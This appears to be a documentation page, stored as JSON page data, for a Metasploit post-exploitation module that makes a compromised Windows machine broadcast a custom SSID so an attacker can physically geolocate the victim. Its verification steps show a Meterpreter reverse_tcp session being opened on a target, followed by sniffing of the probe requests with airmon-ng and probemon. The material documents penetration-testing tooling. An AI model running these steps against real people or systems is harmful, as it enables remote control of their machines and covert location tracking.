{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/post/windows/wlan/wlan_probe_request","result":{"data":{"moduleMetadataJson":{"id":"42c9217a-5812-5d17-8c9d-8d533e8ac4fb","name":"Windows Send Probe Request Packets","fullname":"post/windows/wlan/wlan_probe_request","description":"This module send probe requests through the wlan interface.\n        The ESSID field will be use to set a custom message.","rank":300,"fields":{"detailsSlug":"/modules/details/post/windows/wlan/wlan_probe_request","documentationSlug":"/modules/documentation/post/windows/wlan/wlan_probe_request"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>The module send probe request packets through the wlan interfaces. The user can configure the message to be sent\n(embedded in the SSID field) with a max length of 32 bytes and the time spent in seconds sending those packets\n(considering a sleep of 10 seconds between each probe request).</p>\n<p>The module borrows most of its code from the @thelightcosine wlan<em>* modules (everything revolves around the\nwlanscan API and the DOT11</em>SSID structure).</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>This post module uses the remote victim's wireless card to beacon a specific SSID, allowing an attacker to\ngeolocate him or her during an engagement.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification steps:</h2>\n<h3 id=\"run-the-module-on-a-remote-computer\" style=\"position:relative;\"><a href=\"#run-the-module-on-a-remote-computer\" aria-label=\"run the module on a remote computer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Run the module on a remote computer:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(ms17_010_eternalblue) &gt; use exploit/multi/handler\nmsf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp\npayload =&gt; windows/meterpreter/reverse_tcp\nmsf exploit(handler) &gt; set lhost 192.168.135.111\nlhost =&gt; 192.168.135.111\nmsf exploit(handler) &gt; set lport 4567\nlport =&gt; 4567\nmsf exploit(handler) &gt; run\n\n[*] Started reverse TCP handler on 192.168.135.111:4567 \n[*] Starting the payload handler...\n[*] Sending stage (957487 bytes) to 192.168.135.157\n[*] Meterpreter session 1 opened (192.168.135.111:4567 -&gt; 192.168.135.157:50661) at 2018-04-20 13:20:34 -0500\n\nmeterpreter &gt; sysinfo\nComputer        : WIN10X64-1703\nOS              : Windows 10 (Build 15063).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 2\nMeterpreter     : x86/windows\nmeterpreter &gt; background \n[*] Backgrounding session 1...\nmsf exploit(handler) &gt; use post/windows/wlan/wlan_probe_request \nmsf post(wlan_probe_request) &gt; set ssid &quot;TEST&quot;\nssid =&gt; TEST\nmsf post(wlan_probe_request) &gt; set timeout 300\ntimeout =&gt; 300\nmsf post(wlan_probe_request) &gt; set session 1\nsession =&gt; 1\nmsf post(wlan_probe_request) &gt; run\n\n[*] Wlan interfaces found: 1\n[*] Sending probe requests for 300 seconds\n^C[-] Post interrupted by the console user\n[*] Post module execution completed\nmsf post(wlan_probe_request) &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"on-another-computer-use-probemon-to-listen-for-the-ssid\" style=\"position:relative;\"><a href=\"#on-another-computer-use-probemon-to-listen-for-the-ssid\" aria-label=\"on another computer use probemon to listen for the ssid permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>On another computer, use probemon to listen for the SSID:</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">tmoose@ubuntu:~/rapid7$ ifconfig -a\n.\n.\n.\nwlx00c0ca6d1287 Link encap:Ethernet  HWaddr 00:00:00:00:00:00  \n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)\n\ntmoose@ubuntu:~/rapid7$ sudo airmon-ng start wlx00c0ca6d1287\n\n\nFound 6 processes that could cause trouble.\nIf airodump-ng, aireplay-ng or airtun-ng stops working after\na short period of time, you may want to kill (some of) them!\n\nPID\tName\n963\tNetworkManager\n981\tavahi-daemon\n1002\tavahi-daemon\n1170\tdhclient\n1180\tdhclient\n1766\twpa_supplicant\n\n\nInterface\tChipset\t\tDriver\n\nwlx000000000000\t\tRealtek RTL8187L\trtl8187 - [phy0]\n\t\t\t\t(monitor mode enabled on mon0)\n\ntmoose@ubuntu:~/rapid7$ cd ..\n\ntmoose@ubuntu:~$ sudo python probemon.py -t unix -i mon0 -s -r -l | grep TEST\n1524248955\t74:ea:3a:8e:a1:6d\tTEST\t-59\n1524248955\t74:ea:3a:8e:a1:6d\tTEST\t-73\n1524248955\t74:ea:3a:8e:a1:6d\tTEST\t-63\n1524248955\t74:ea:3a:8e:a1:6d\tTEST\t-68\n1524248956\t74:ea:3a:8e:a1:6d\tTEST\t-74\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-59\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-60\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-74\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-73\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-63\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-63\n1524248965\t74:ea:3a:8e:a1:6d\tTEST\t-78\n\n.\n.\n.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"42c9217a-5812-5d17-8c9d-8d533e8ac4fb"}}}